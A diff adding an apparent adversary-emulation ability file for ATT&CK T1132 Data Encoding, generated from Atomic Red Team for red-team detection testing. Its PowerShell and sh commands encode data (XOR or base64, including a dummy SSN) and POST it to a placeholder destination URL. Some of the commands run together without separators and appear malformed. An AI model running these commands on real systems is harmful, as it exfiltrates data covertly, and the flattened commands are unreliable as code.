@@ -1,0 +1,23 @@
+- id: 67f778ee-7612-4e86-b7d8-69dc9e48751f
+  name: Data Encoding
+  description: Ability for Data Encoding (ATT&CK T1132). Generated from Atomic Red
+    Team procedures; review and test safely before use.
+  tactic: command-and-control
+  technique:
+    attack_id: T1132
+    name: Data Encoding
+  platforms:
+    windows:
+      psh:
+        command: '$plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"))
+          $key = "#{key}" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count;
+          $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; } $cyphertext
+          = [system.Text.Encoding]::UTF8.getString($cyphertext) [System.Net.ServicePointManager]::Expect100Continue
+          = $false Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext
+          -DisableKeepAlive'
+    linux:
+      sh:
+        command: 'echo -n 111-11-1111 | base64 curl -XPOST #{base64_data}.#{destination_url}'
+    darwin:
+      sh:
+        command: 'echo -n 111-11-1111 | base64 curl -XPOST #{base64_data}.#{destination_url}'
